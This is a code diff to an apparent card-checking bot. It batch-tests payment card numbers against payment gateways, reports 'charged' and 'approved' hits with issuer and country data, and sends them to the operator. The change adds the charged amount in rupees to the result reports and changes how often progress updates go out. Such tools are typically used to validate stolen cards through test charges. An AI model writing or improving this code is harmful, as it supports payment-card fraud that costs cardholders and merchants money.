@@ -320,11 +320,13 @@ def generate_result_file_content(session, result_type):
             bank = cd.get("bank", "N/A")
             country = cd.get("country", "N/A")
             status = cd.get("status", "N/A")
+            amount = cd.get("amount_inr", "N/A")
 
             lines.append(f"𝐒𝐭𝐚𝐭𝐮𝐬 ➠ {status}")
             lines.append(f"𝐂𝐚𝐫𝐝 ➠ {cc}")
             lines.append(f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ {session.get('gateway', '')}")
             lines.append(f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ {response}")
+            lines.append(f"𝐀𝐦𝐨𝐮𝐧𝐭 ➠ ₹{amount}")
             lines.append(f"𝐁𝐫𝐚𝐧𝐝 ➠ {brand}")
             lines.append(f"𝐈𝐬𝐬𝐮𝐞𝐫 ➠ {bank}")
             lines.append(f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➠ {country}")
@@ -449,9 +451,16 @@ async def run_batch_check(message, cards, check_fn, gateway, user_id, user_obj, 
             if session["status"] == "𝗦𝘁𝗼𝗽𝗽𝗲𝗱":
                 return
             try:
-                status, msg, brand = await asyncio.to_thread(check_fn, card)
+                res = await asyncio.to_thread(check_fn, card)
             except Exception as e:
-                status, msg, brand = "ERROR", str(e)[:80], "UNKNOWN"
+                res = ("ERROR", str(e)[:80], "UNKNOWN")
+            if isinstance(res, (tuple, list)) and len(res) >= 4:
+                status, msg, brand, amount = res[0], res[1], res[2], res[3]
+            elif isinstance(res, (tuple, list)) and len(res) >= 3:
+                status, msg, brand = res[0], res[1], res[2]
+                amount = None
+            else:
+                status, msg, brand, amount = "ERROR", str(res), "UNKNOWN", None
 
         kind = classify_status(status)
 
@@ -473,6 +482,7 @@ async def run_batch_check(message, cards, check_fn, gateway, user_id, user_obj, 
             "bank": bin_data.get("bank", "N/A"),
             "country": (f"{bin_data.get('country', 'N/A')} {bin_data.get('country_emoji', '')}").strip(),
             "status": kind.upper() if kind != "errors" else "ERROR",
+            "amount_inr": amount if amount is not None else "N/A",
         }
 
         async with lock:
@@ -489,7 +499,7 @@ async def run_batch_check(message, cards, check_fn, gateway, user_id, user_obj, 
             else:
                 session["error_cards"].append(entry)
 
-            should_update = session["checked"] % 50 == 0 or session["checked"] == total
+            should_update = (time.time() - session.get("last_update_time", 0)) >= 2.0 or session["checked"] == total
 
         # send result for approved/charged hits (respect the DM toggles)
         if kind == "charged" and session.get("send_charged", True):
